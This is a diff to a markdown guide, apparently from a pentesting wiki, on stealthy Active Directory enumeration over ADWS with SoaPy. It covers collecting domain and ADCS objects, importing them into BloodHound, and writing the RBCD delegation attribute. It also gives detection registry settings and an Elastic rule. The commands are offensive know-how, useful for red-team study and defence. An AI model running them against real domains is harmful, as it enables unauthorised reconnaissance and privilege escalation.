@@ -1,6 +1,5 @@
 # Active Directory Web Services (ADWS) Enumeration & Stealth Collection
 
-
 ## What is ADWS?
 
 Active Directory Web Services (ADWS) is **enabled by default on every Domain Controller since Windows Server 2008 R2** and listens on TCP **9389**.  Despite the name, **no HTTP is involved**.  Instead, the service exposes LDAP-style data through a stack of proprietary .NET framing protocols:
@@ -17,7 +16,7 @@ Because the traffic is encapsulated inside these binary SOAP frames and travels 
 
 ## SoaPy – Native Python Client
 
-[[https://github.com/logangoins/soapy|SoaPy]] is a **full re-implementation of the ADWS protocol stack in pure Python**.  It crafts the NBFX/NBFSE/NNS/NMF frames byte-for-byte, allowing collection from Unix-like systems without touching the .NET runtime.
+[SoaPy](https://github.com/logangoins/soapy) is a **full re-implementation of the ADWS protocol stack in pure Python**.  It crafts the NBFX/NBFSE/NNS/NMF frames byte-for-byte, allowing collection from Unix-like systems without touching the .NET runtime.
 
 ### Key Features
 
@@ -32,7 +31,7 @@ Because the traffic is encapsulated inside these binary SOAP frames and travels 
 ```bash
 python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
 ```
-```
+
 ## Stealth AD Collection Workflow
 
 The following workflow shows how to enumerate **domain & ADCS objects** over ADWS, convert them to BloodHound JSON and hunt for certificate-based attack paths – all from Linux:
@@ -46,7 +45,7 @@ soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
       -q '(objectClass=domain)' \
       | tee data/domain.log
 ```
-```
+
 3. **Collect ADCS-related objects from the Configuration NC:**
 
 ```bash
@@ -56,13 +55,13 @@ soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
            (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
       | tee data/adcs.log
 ```
-```
+
 4. **Convert to BloodHound:**
 
 ```bash
 bofhound -i data --zip   # produces BloodHound.zip
 ```
-```
+
 5. **Upload the ZIP** in the BloodHound GUI and run cypher queries such as `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` to reveal certificate escalation paths (ESC1, ESC8, etc.).
 
 ### Writing `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
@@ -72,7 +71,7 @@ soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
       --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
       msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
 ```
-```
+
 Combine this with `s4u2proxy`/`Rubeus /getticket` for a full **Resource-Based Constrained Delegation** chain.
 
 ## Detection & Hardening
@@ -86,7 +85,7 @@ New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics
 New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
 New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
 ```
-```
+
 Events will appear under **Directory-Service** with the full LDAP filter, even when the query arrived via ADWS.
 
 ### SACL Canary Objects
@@ -100,19 +99,19 @@ Elastic pre-built rule example:
 ```kql
 (event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
 ```
-```
+
 ## Tooling Summary
 
 | Purpose | Tool | Notes |
 |---------|------|-------|
-| ADWS enumeration | [[https://github.com/logangoins/soapy|SoaPy]] | Python, SOCKS, read/write |
-| BloodHound ingest | [[https://github.com/bohops/BOFHound|BOFHound]] | Converts SoaPy/ldapsearch logs |
-| Cert compromise | [[https://github.com/ly4k/Certipy|Certipy]] | Can be proxied through same SOCKS |
+| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
+| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
+| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
 
 ## References
 
-* [[https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/|SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS]]
-* [[https://github.com/logangoins/soapy|SoaPy GitHub]]
-* [[https://github.com/bohops/BOFHound|BOFHound GitHub]]
-* [[https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/|Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications]]
+* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
+* [SoaPy GitHub](https://github.com/logangoins/soapy)
+* [BOFHound GitHub](https://github.com/bohops/BOFHound)
+* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
 
